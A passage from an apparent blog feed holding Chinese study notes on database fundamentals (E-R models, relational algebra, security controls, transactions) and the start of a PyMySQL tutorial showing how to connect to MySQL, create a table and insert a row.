class="language-none">为了把现实世界中的具体事物抽象、组织为某一DBMS支持的数据模型，首先将现实世界的事物及其联系进行特征抽取，形成信息世界的概念模型，这种模型不依赖于具体的计算机系统，然后再将概念模型转换为某一DBMS所支持的逻辑模型和物理模型。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>现实世界 现实世界即客观存在的世界</li><li>信息世界是现实世界在人们头脑中的反映，经过人脑的分析、归纳、抽象，形成信息，把这些信息进行记录、整理、归类和格式化后，就构成了信息世界。<ul><li>实体（Entity）：客观存在并且可以相互区分的事物称为实体</li><li>属性（Attribute）：实体所具有的某一特性称为属性</li><li>码（Key）：能唯一标识实体的属性或属性的组合称为码，也称为键</li><li>域（Domain）：属性的取值范围称为该属性的域</li><li>实体型（Entity Type）：用实体名及其所有属性的集合来描述同类实体，称为实体型</li><li>实体集（Entity Set）：同一类型实体的集合称为实体集</li><li>联系<ul><li>一对一联系（1:1）如果对于实体集E1中的每一个实体，实体集E2中至多有一个（也可以没有）实体与之联系，反之亦然，则称实体集E1与实体集E2具有一对一联系，记为1:1</li><li>一对多联系（1:n）如果对于实体集E1中的每一个实体，实体集E2中至多有n个实体（n≥0）与之联系；反之，对于实体集E2中的每一个实体，实体集E1中至多有一个实体与之联系，则称实体集E1与实体集E2具有一对多联系，记为1:n。</li><li>多对多联系（m:n）如果对于实体集E1中的每一个实体，实体集E2中有n个实体（n≥0）与之联系，反之，对于实体集E2中的每一个实体，实体集E1中也有m个实体（m≥0）与之联系，则称实体集E1与实体集E2具有多对多联系，记为m:n</li></ul></li></ul></li><li>机器世界是信息世界中信息的数据化，就是将信息用字符和数值等数据表示，便于存储在计算机中，并由计算机进行识别和处理<ul><li>文件（file）：同一类记录的集合称为文件，文件是用来描述实体集的</li><li>关键字（key）：能唯一标识文件中每条记录的字段或字段集，称为记录的关键字，或者简称为键。</li></ul></li></ol><h4 id="E-R图的相关信息"><a href="#E-R图的相关信息" class="headerlink" title="E-R图的相关信息"></a>E-R图的相关信息</h4><p>概念模型是对信息世界的建模，它能方便、准确地描述信息世界中的概念。</p><p>概念模型有很多表示方法，其中最著名、最常用的是P.P.S.Chen于1976年提出的实体－联系方法，也称为实体－联系模型，该方法用E-R图来表示实体、属性以及实体间的联系。</p><blockquote><ol><li>实体用矩形表示，矩形框内写明实体名</li><li>属性用椭圆形表示，并用无向边将其与相应的实体连接起来</li><li>联系用菱形表示，菱形框内写明联系名，并用无向边分别与有关实体连接起来，同时在无向边旁标上联系的类型（1:1、1:n或m:n）</li><li>联系也可能有属性，联系的属性用椭圆形表示，并用无向边与该联系连接起来。</li><li>一对一联系（1:1）如果对于实体集E1中的每一个实体，实体集E2中至多有一个（也可以没有）实体与之联系，反之亦然，则称实体集E1与实体集E2具有一对一联系，记为1:1</li><li>一对多联系（1:n）如果对于实体集E1中的每一个实体，实体集E2中至多有n个实体（n≥0）与之联系；反之，对于实体集E2中的每一个实体，实体集E1中至多有一个实体与之联系，则称实体集E1与实体集E2具有一对多联系，记为1:n。</li><li>多对多联系（m:n）如果对于实体集E1中的每一个实体，实体集E2中有n个实体（n≥0）与之联系，反之，对于实体集E2中的每一个实体，实体集E1中也有m个实体（m≥0）与之联系，则称实体集E1与实体集E2具有多对多联系，记为m:n。</li><li>多个实体集之间多对多联系的定义:若实体型Ej（j=1，2，…，i-1，i+1，…，n）中的给定实体，和Ei中的多个实体相联系，则Ei与E1，E2，…，Ei-1，Ei+1，…，En之间的联系是多对多的</li></ol></blockquote><h4 id="数据模型的组成要素"><a href="#数据模型的组成要素" class="headerlink" title="数据模型的组成要素"></a>数据模型的组成要素</h4><ul><li>数据结构：描述数据的类型、内容、性质及数据间的联系，是对系统静态特征的描述，是数据模型中最基本的部分，不同的数据模型采用不同的数据结构。</li><li>数据操作：主要描述在相应的数据结构上允许执行的操作的集合，包括操作以及有关的操作规则，是对系统动态特征的描述。对数据库的操作主要有查询和更新（插入、删除、修改）两类操作</li><li>完整性约束：主要描述数据结构内的数据及其联系所具有的制约和依存规则，用以限定符合数据模型的数据库状态以及状态的变化，以保证数据的正确性、有效性和相容性。</li></ul><p>关系模型：建立在严格的数学概念基础之上，采用二维表来表示实体和实体之间的联系，是目前应用最多、最重要的一种数据模型</p><blockquote><p>关系（Relation）一个关系对应通常说的一张表。<br>元组（Tuple）表中的一行即为一个元组。（第一行除外）<br>属性（Attribute）表中的一列即为一个属性，列名即是属性名，列值即是属性值<br>域（Domain）：属性的取值范围。<br>分量：元组中的一个属性值<br>码（Key）：属性或属性的组合，能唯一确定一个元组。一个关系中可以有多个码。<br>关系模式：对关系的描述，表示为:关系名（属性1，属性2，…，属性n）</p></blockquote><h3 id="1-5-数据库系统的内部结构"><a href="#1-5-数据库系统的内部结构" class="headerlink" title="1.5 数据库系统的内部结构"></a>1.5 数据库系统的内部结构</h3><p>数据库系统内部采用三级模式二级映像结构，三级模式为：外模式，模式，内模式。二级映像：外模式/模式映射，模式/内模式映射</p><p>1．模式：是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图，一个数据库只能有一个概念模式。<br>2．内模式：是数据库中全体数据的物理结构和存储方式的描述，是数据在数据库内部的表示方式，一个数据库只能有一个内模式。</p><p>3．外模式：又称为子模式或用户模式，是模式的子集，是数据库用户能够看到和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示，一个数据库可以有多个外模式。</p><p>4．外模式/模式映像：对于每一个外模式，都有一个外模式/模式映像。它定义了该外模式与模式之间的对应关系。</p><p>5．模式/内模式映像，数据库中有唯一的一个模式/内模式映像，它定义了数据全局逻辑结构与存储结构之间的对应关系。</p><h3 id="1-6-数据库系统的外部结构"><a href="#1-6-数据库系统的外部结构" class="headerlink" title="1.6 数据库系统的外部结构"></a>1.6 数据库系统的外部结构</h3><p>略</p><h3 id="1-7-常见的关系数据库"><a href="#1-7-常见的关系数据库" class="headerlink" title="1.7 常见的关系数据库"></a>1.7 常见的关系数据库</h3><blockquote><p>Oracle数据库</p><p>由数据库软件领域的第一大厂商     Oracle公司研发<br>主要应用于大型企业数据库领域；跨平台，支持Windows、UNIX等多种操作系统；运行稳定、功能齐全、性能超群</p></blockquote><blockquote><p>SQL Server数据库管理系统            由微软公司研发的中大型数据库管理系统<br>只能运行于Windows平台上；界面友好，易学易用；支持C/S、B/S模式</p></blockquote><blockquote><p>Sybase                                               由Sybase公司研发的大型数据库管理系统<br>可以运行于UNIX、VXM、Windows等多种操作系统平台上，支持标准的SQL语言：使用C/S工作模式</p></blockquote><blockquote><p>DB2<br>是IBM公司研发的一个多媒体、Web关系型数据库<br>起初主要应用在大型机上，目前支持多种机型</p></blockquote><blockquote><p>MySQL                                               Oracle公司旗下产品<br>体积小、速度快、功能有限；开放源码软件</p></blockquote><h2 id="第2章-数据库系统原理"><a href="#第2章-数据库系统原理" class="headerlink" title="第2章 数据库系统原理"></a>第2章 数据库系统原理</h2><h3 id="2-1关系的形式化定义及有关概念"><a href="#2-1关系的形式化定义及有关概念" class="headerlink" title="2.1关系的形式化定义及有关概念"></a>2.1关系的形式化定义及有关概念</h3><p>关系模型以集合代数理论为基础，本节将从集合论角度给出关系的形式化定义</p><blockquote><ol><li>域（Domain）</li><li>笛卡尔积（Cartesian Product）</li><li>关系（Relation）</li></ol></blockquote><p><strong>域</strong>是一组具有相同数据类型的值的集合，又称为值域，用D 表示.</p><p>**笛卡尔积(Cartesian Product)**给定一组域D1,D2,…,Dn,它们中可以有相同的域。D1,D2,…,Dn的笛卡尔积为:D=D1×D2×…×Dn＝{(d1,d2,…,dn)｜diDi,i＝1,2,…,n}</p><p>笛卡尔积的元组可以用二维表的形式表示</p><p><strong>关系（Relation）</strong>D1×D2×…×Dn的有意义的子集称为在域D1，D2，…，Dn上的关系，表示为R（D1，D2，…，Dn） student(sno,sname,ssex)，R：关系名，n：关系的目或度（Degree）<br>当n=1 时，称该关系为单元关系，当 n=2时，称该关系为二元关系</p><blockquote><p>列是同质的，即每一列的分量是同一类型的数据，来自同一个域；<br>属性名是唯一的，不同的列可以出自同一个域，但属性名必须不同；<br>码的唯一性，即任意两个元组的码不能相同，从而任意两个元组不相同；<br>列的顺序无关性，即交换任意两列的次序，得到的还是同一个关系；<br>行的顺序无关性，即交换任意两行的次序，得到的还是同一个关系；<br>分量的原子性，即每个分量都是不可分的数据项。</p></blockquote><p>关系模式:关系模式是对一个关系结构的描述，包括关系由哪些属性构成，这些属性来自哪些域，以及属性和域之间的映射关系(mapping)。因此，一个关系模式应当是一个五元组。<br>关系模式（Relation Schema）是对关系的描述，可形式化地表示为R (U，D，DOM，F)      student(sno, sname, ssex)</p><blockquote><p>R为关系模式名<br>U为组成该关系的属性名的集合<br>D为属性组U中属性所来自的域的集合<br>DOM为属性向域映像的集合<br>F为属性间函数依赖关系的集合</p></blockquote><ul><li>关系  关系是由满足关系模式结构的元组构成的集合，是关系模式在某一时刻的状态或内容</li><li>关系数据库  在一个给定的应用领域中，所有实体entity以及实体间联系(relationship)的集合构成一个关系数据库</li></ul><h3 id="2-2关系数据库示例"><a href="#2-2关系数据库示例" class="headerlink" title="2.2关系数据库示例"></a>2.2关系数据库示例</h3><ol><li>码（Key）：又称为候选码（Candidate  Key）能唯一标识关系中的每一个元组的最少属性的集合。一个关系可能有多个候选码</li><li>主码（Primary  Key）：又称为主键，在候选码中选出一个即可作为主码在一个关系中，主码只能有一个</li><li>全码（ALL- Key）：关系中所有属性的组合才是该关系的码，一个关系最多只有一个全码</li><li>外码（Foreign  Key）：设属性F是关系R的一个属性，但不是R的码，如果F与关系S中的主码Ks相对应，则称F是R的外码，R为参照关系（Referencing  Relation），S为被参照关系（Referenced  Relation）。R和S不一定是不同的关系，通过外码可以建立两个表之间的联系，在一个关系中，外码可能有多个</li><li>主属性（Prime  Attribute）：包含在所有候选码中的属性称为主属性</li><li>非主属性（Nonprime  Attribute）：不包含在任何一个候选码中的属性称为非主属性。</li></ol><h3 id="2-3关系模型的完整性"><a href="#2-3关系模型的完整性" class="headerlink" title="2.3关系模型的完整性"></a>2.3关系模型的完整性</h3><blockquote><p>作用：为了确保数据库里边的数据是正确的、有效的、一致的。</p></blockquote><p><strong>实体完整性</strong>(Entity Integrity)：1.若属性A是基本关系R的主属性，则属性A不能取空值；2.关系的所有的主属性都不能取空值，而不仅是主码整体不能取空值</p><p><strong>参照完整性</strong>若属性（或属性组）F是基本关系R的外码，它与基本关系S的主码KS相对应,则对于R中的每个元组在F上的值必须为：要么取空值，要么等于被参照关系中的主键的某个值</p><p><strong>用户自定义完整性</strong>属性的取值应当满足用户定义的约束条件，反映了某一具体应用所涉及的数据必须满足的语义要求。</p><h3 id="2-4关系模型的数据操作"><a href="#2-4关系模型的数据操作" class="headerlink" title="2.4关系模型的数据操作"></a>2.4关系模型的数据操作</h3><p>数据模型三要素：数据结构、数据操作、完整性约束</p><p>数据查询(Query)：选择(Select)、投影(Project)、连接(Join)、除(Divide)、并(Union)、交(Intersection)、差(Difference)、笛卡儿积<br>数据更新(Update)：插入(Insert)、删除(Delete)、修改(Modify)</p><h3 id="2-5关系代数"><a href="#2-5关系代数" class="headerlink" title="2.5关系代数"></a>2.5关系代数</h3><p>关系代数是一种抽象的查询语言，是研究关系数据语言的数学工具</p><h4 id="关系的运算符"><a href="#关系的运算符" class="headerlink" title="关系的运算符"></a>关系的运算符</h4><blockquote><ul><li>集合运算符：将关系看成元组的集合运算，是从关系的“水平”方向即行的角度来进行</li><li>专门的关系运算符：不仅涉及行而且涉及列</li><li>比较运算符：辅助专门的关系运算符进行操作</li><li>逻辑运算符：辅助专门的关系运算符进行操作</li></ul></blockquote><h4 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h4><h5 id="并"><a href="#并" class="headerlink" title="并"></a>并</h5><p>关系R和关系S的要求：具有相同的目n，即两个关系都有n个属性，相应的属性取自同一个域。</p><blockquote><p>$$<br>R∪S 结果仍为n目关系，由属于R或属于S的元组组成R∪S = { t|t \in R∨t \in S }<br>$$</p></blockquote><h5 id="差"><a href="#差" class="headerlink" title="差"></a>差</h5><p>关系R和关系S的要求：具有相同的目n，相应的属性取自同一个域</p><blockquote><p>$$<br>R - S<br>结果仍为n目关系，由属于R而不属于S的所有元组组成<br>                R -S = { t|t\in R∧t \notin S }<br>$$</p></blockquote><h5 id="交"><a href="#交" class="headerlink" title="交"></a>交</h5><p>关系R和关系S的要求：具有相同的目n，相应的属性取自同一个域</p><blockquote><p>$$<br>R∩S<br>结果仍为n目关系，由既属于R又属于S的元组组成,R∩S = { t|t \in R∧t \in S }<br>$$</p></blockquote><h5 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h5><pre class="line-numbers language-none"><code class="language-none">R：n目关系，k1个元组S：m目关系，k2个元组R×S：列：（n+m）列的元组的集合，元组的前n列是关系R的一个元组，后m列是关系S的一个元组行：k1×k2个元组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$$<br>R×S = { tr∩ts |tr \in R ∧ ts \in S }<br>$$</p><h4 id="专门的关系运算"><a href="#专门的关系运算" class="headerlink" title="专门的关系运算"></a>专门的关系运算</h4><h5 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h5><h5 id="投影"><a href="#投影" class="headerlink" title="投影"></a>投影</h5><h5 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h5><h5 id="除"><a href="#除" class="headerlink" title="除"></a>除</h5><h2 id="第5章-数据库的安全性"><a href="#第5章-数据库的安全性" class="headerlink" title="第5章  数据库的安全性"></a>第5章  数据库的安全性</h2><blockquote><p>数据库的安全性是指保护数据库，以防止不合法的使用造成数据泄露、更改或破坏<br>不合法的使用一般是指合法用户进行的非法操作以及非法用户进行的所有操作<br>数据库的安全性就是保证所有合法的用户进行合法的操作</p></blockquote><h3 id="5-1-计算机安全性概述"><a href="#5-1-计算机安全性概述" class="headerlink" title="5.1 计算机安全性概述"></a>5.1 计算机安全性概述</h3><p>计算机系统的安全性问题可分为三大类：技术安全，管理安全，政策法律</p><h3 id="5-2-数据库安全性控制"><a href="#5-2-数据库安全性控制" class="headerlink" title="5.2 数据库安全性控制"></a>5.2 数据库安全性控制</h3><p>在一般的计算机系统中，安全措施是一级一级层层设置的</p><p><img src="D:\blog\shierjinghuang\source_posts\数据库复习资料整理\1657872425851.png"></p><h4 id="用户标识与鉴别"><a href="#用户标识与鉴别" class="headerlink" title="用户标识与鉴别"></a>用户标识与鉴别</h4><p>用户标识与鉴别是数据库系统的最外层安全保护措施<br>其方法是由系统提供一定的方式让用户标识自己的身份，每次用户要求进入系统时，由系统进行核对，通过鉴定后才会提供系统使用权</p><h4 id="存取控制机制"><a href="#存取控制机制" class="headerlink" title="存取控制机制"></a>存取控制机制</h4><p>数据库的安全性措施中最重要的是DBMS的存取控制机制</p><p>合法权限检查<br>当用户发出存取数据的操作请求后，DBMS查找数据字典，根据安全规则进行合法权限检查。<br>若用户的操作请求超出了定义的权限，系统将拒绝执行该操作。</p><p>大多数DBMS支持的存取控制策略主要有两种：自主存取控制，强制存取控制</p><p>自主存取控制方法的特点如下：<br>① 同一用户对于不同的数据库对象有不同的存取权限；<br>② 不同的用户对同一对象也有不同的权限；<br>③ 用户还可将其拥有的存取权限转授给其他用户</p><p>强制存取控制</p><p>在MAC中，DBMS管理的全部实体分为主体和客体<br>主体<br>是指系统中活动的实体，如用户、进程等<br>客体<br>是系统中的被动实体，如文件、基本表、视图等<br>对主体和客体的每一个实例（值）都指派一个敏感度标记<br>主体的敏感度标记称为“许可证级别”<br>客体的敏感度标记称为“密级”<br>敏感度标记的级别从高到低依次为：绝密、机密、可信和公开等</p><p>强制存取控制方法的特点如下：<br>① 每一个数据对象被标以一定的密级；<br>② 每一个用户也被授予某一个级别的许可证；<br>③ 通过对比主体和客体的级别，最终确定主体能否存取客体，只有具有合法许可证的用户才可以存取数据。<br>在MAC中，主体存取客体要遵循如下规则：<br>① 仅当主体的许可证级别大于或等于客体的密级时，该主体才能读取相应的客体；<br>② 仅当主体的许可证级别等于客体的密级时，该主体才能写相应的客体。</p><h4 id="视图机制"><a href="#视图机制" class="headerlink" title="视图机制"></a>视图机制</h4><p>在进行存取权限控制时，可以为不同的用户定义不同的视图，把数据对象限制在一定的范围内<br>也就是说，通过视图机制把要保密的数据对无权存取的用户隐藏起来，从而自动地对数据提供一定程度的<br>但视图机制的安全保护功能太不精细，往往不能达到应用系统的要求，其主要功能在于提供了数据库的逻辑独立性<br>在实际应用中，通常将视图机制与授权机制结合起来使用，首先利用视图机制屏蔽一部分保密数据，然后在视图上再进一步定义存取权限安全保护</p><h4 id="审计跟踪"><a href="#审计跟踪" class="headerlink" title="审计跟踪"></a>审计跟踪</h4><p>审计功能是一种监视措施，它把用户对数据库的所有操作自动记录下来，存入审计日志中<br>记录的内容一般包括：操作类型（查询、插入、更新、删除），操作终端标识与操作者标识，操作日期和时间，操作所涉及的相关数据，数据的前象和后象等<br>DBA可以利用审计跟踪的信息，重现导致数据库现有状况的一系列事件，找出非法存取数据的人、时间和内容等。<br>审计通常是很费时间和空间的，所以DBMS把它作为系统的可选特征，DBA根据应用环境对安全性的要求，可以灵活地打开或关闭审计功能。</p><h4 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h4><p>数据加密是防止数据库中数据在存储和传输中失密的有效手段<br>加密的基本思想是根据一定的算法将原始数据变化为不可直接识别的格式，数据以密文的形式存储和传输<br>加密方法主要有两种<br>一种是替换方法<br>一种是置换方法<br>数据加密功能通常也作为可选特征</p><h4 id="统计数据库的安全性"><a href="#统计数据库的安全性" class="headerlink" title="统计数据库的安全性"></a>统计数据库的安全性</h4><h2 id="第6章-事务与并发控制"><a href="#第6章-事务与并发控制" class="headerlink" title="第6章  事务与并发控制"></a>第6章  事务与并发控制</h2><h3 id="6-1-事务"><a href="#6-1-事务" class="headerlink" title="6.1 事务"></a>6.1 事务</h3><p>事务（Transaction）是用户定义的一个数据库操作序列，这些操作要么全做，要么全不做，是一个不可分割的工作单位。</p><p>一个程序在后台运行时通常被分割成多个事务，即一个程序由多个事务组成。事务可以是一条SQL语句，一组SQL语句或整个程序<br>事务的划分有两种方式：隐式划分，显式划分</p><h4 id="事务的特征"><a href="#事务的特征" class="headerlink" title="事务的特征:"></a><strong>事务的特征:</strong></h4><ol><li><p>原子性：事务是数据库的逻辑工作单位，是不可分割的工作单元，事务中的诸操作要么都做，要么都不做。</p></li><li><p>持久性：也称永久性，一个事务一旦提交它对数据库中数据的改变就应该是永久性的，接下来的其他操作或故障不应该对其执行结果由任何影响</p></li><li><p>隔离性：一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对于其他事务是隔离的，并发执行的各个事务之间不能互相干扰。</p></li><li><p>一致性：事务的执行结果必须是使数据库从一个一致性状态变到另一个一致性状态，一致性状态是指数据库中只包含成功事务提交的结果，不一致状态是指数据库中包含失败事务提交的部分结果。</p></li></ol><h4 id="事务的执行方式"><a href="#事务的执行方式" class="headerlink" title="事务的执行方式"></a><strong>事务的执行方式</strong></h4><ol><li><p>串行：按顺序依次执行，执行完一个事务后才能开始另一个事务</p></li><li><p>交叉并发执行：是指多个事务轮流交叉并发执行</p></li></ol><h3 id="6-2-并发控制"><a href="#6-2-并发控制" class="headerlink" title="6.2 并发控制"></a>6.2 并发控制</h3><p>丢失修改:</p><p>丢失修改的含义：两个事务T1和T2读取同一数据并分别进行修改，T1先提交了修改结果，T2后提交的修改结果覆盖了T1提交的结果，导致T1的修改结果丢失</p><p>读“脏”数据:</p><p>读“脏”数据的含义：事务T1修改某一数据，并将其写回磁盘。事务T2读取同一数据后，事务T1由于某种原因被撤销，这时事务T1修改过的数据恢复原值，而事务T2读取到的是一个过渡性的不再需要的脏数据，与数据库中的数据不同。</p><p>不可重复读:</p><h3 id="6-3-封锁"><a href="#6-3-封锁" class="headerlink" title="6.3 封锁"></a>6.3 封锁</h3><h3 id="6-4-并发调度的可串行性"><a href="#6-4-并发调度的可串行性" class="headerlink" title="6.4 并发调度的可串行性"></a>6.4 并发调度的可串行性</h3><h3 id="6-5-两段锁协议"><a href="#6-5-两段锁协议" class="headerlink" title="6.5 两段锁协议"></a>6.5 两段锁协议</h3>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3 MySQL 数据库连接 - PyMySQL 驱动</title>
      <link href="/2022/07/08/PyMySQL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/07/08/PyMySQL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1>Python3 MySQL 数据库连接 - PyMySQL 驱动</h1><p>[TOC]</p><p>PyMySQL 是在 Python3.x 版本中用于连接 MySQL 服务器的一个库，Python2 中则使用 mysqldb</p><p>准备要求：mysql8.0以上版本及python3.0以上版本。</p><h2 id="使用pymysql链接数据库">使用PyMySQL链接数据库</h2><p>实例： 链接 Mysql 的 testdb 数据库：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span><span class="token keyword">import</span> pymysql<span class="token comment"># 打开数据库连接</span>db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">'testdb'</span><span class="token punctuation">)</span><span class="token comment"># 使用 cursor() 方法创建一个游标对象 cursor</span>cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 使用 execute()  方法执行 SQL 查询</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT VERSION()"</span><span class="token punctuation">)</span><span class="token comment"># 使用 fetchone() 方法获取单条数据.</span>data <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Database version : %s "</span> <span class="token operator">%</span> data<span class="token punctuation">)</span><span class="token comment"># 关闭数据库连接</span>db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pymysql-connect-连接数据库函数">pymysql.connect()连接数据库函数</h3><h4 id="pymysql-connect-参数说明">pymysql.Connect()参数说明</h4><table><thead><tr><th>host(str)</th><th>MySQL服务器地址</th></tr></thead><tbody><tr><td>port(int)</td><td>MySQL服务器端口号</td></tr><tr><td>user(str)</td><td>用户名</td></tr><tr><td>passwd(str)</td><td>密码</td></tr><tr><td>db(str)</td><td>数据库名称</td></tr><tr><td>charset(str)</td><td>连接编码</td></tr></tbody></table><h4 id="connection对象">connection对象:</h4><p>使用pymysql.Connect()生成的是一个connection对象，Connection对象也称为数据库连接对象，Connection对象的功能是负责对数据源的连接。</p><p>其功能包括：获取游标 <code>cursor()</code> ，<code>commit()</code>提交当前事务，<code>rollback()</code>回滚当前事务，<code>close()</code>关闭连接。</p><h3 id="cursor-获取游标">cursor():获取游标</h3><p>要想操作数据库，光连接数据是不够的，必须拿到操作数据库的游标，才能进行后续的操作，比如读取数据、添加数据。通过获取到的数据库连接实例conn下的cursor()方法来创建游标。游标用来接收返回结果</p><p>cursor返回一个游标实例对象，其中包含了很多操作数据的方法</p><table><thead><tr><th>execute(op)</th><th>执行一个数据库的查询命令</th></tr></thead><tbody><tr><td>fetchone()</td><td>取得结果集的下一行</td></tr><tr><td>fetchmany(size)</td><td>获取结果集的下几行</td></tr><tr><td>fetchall()</td><td>获取结果集中的所有行</td></tr><tr><td>rowcount()</td><td>返回数据条数或影响行数</td></tr><tr><td>close()</td><td>关闭游标对象</td></tr></tbody></table><h2 id="对数据库的各种操作">对数据库的各种操作</h2><h3 id="创建类操作：">创建类操作：</h3><h4 id="创建数据库">创建数据库</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接，不需要指定数据库，因为需要创建数据库</span>conn <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">,</span>passwd <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cursor<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#创建pythonBD数据库</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'CREATE DATABASE IF NOT EXISTS pythonDB DEFAULT CHARSET utf8 COLLATE utf8_general_ci;'</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#先关闭游标</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#再关闭数据库连接</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'创建pythonBD数据库成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="创建数据库表">创建数据库表</h4><p>建立数据库连接后，可以使用创建的游标的<code>execute（）</code>方法将数据库表或记录创建到数据库表中。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"localhost"</span><span class="token punctuation">,</span>user <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">,</span>passwd <span class="token operator">=</span> <span class="token string">"28283860"</span><span class="token punctuation">,</span>db <span class="token operator">=</span> <span class="token string">"pythondb"</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cursor<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cursor<span class="token punctuation">)</span><span class="token comment">#创建user表</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'drop table if exists user'</span><span class="token punctuation">)</span>sql<span class="token operator">=</span><span class="token triple-quoted-string string">"""CREATE TABLE IF NOT EXISTS `user` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `name` varchar(255) NOT NULL,  `age` int(11) NOT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=0"""</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#先关闭游标</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#再关闭数据库连接</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'创建数据表成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="插入操作">插入操作:</h3><p>当要将记录创建到数据库表中时，需要执行<code>INSERT</code>操作。</p><p>插入单条数据：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接，不指定数据库</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span><span class="token comment">#创建user表</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'drop table if exists user'</span><span class="token punctuation">)</span>sql<span class="token operator">=</span><span class="token triple-quoted-string string">"""CREATE TABLE IF NOT EXISTS `user` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `name` varchar(255) NOT NULL,  `age` int(11) NOT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=0"""</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>insert<span class="token operator">=</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"insert into user values(1,'tom',18)"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'添加语句受影响的行数：'</span><span class="token punctuation">,</span>insert<span class="token punctuation">)</span><span class="token 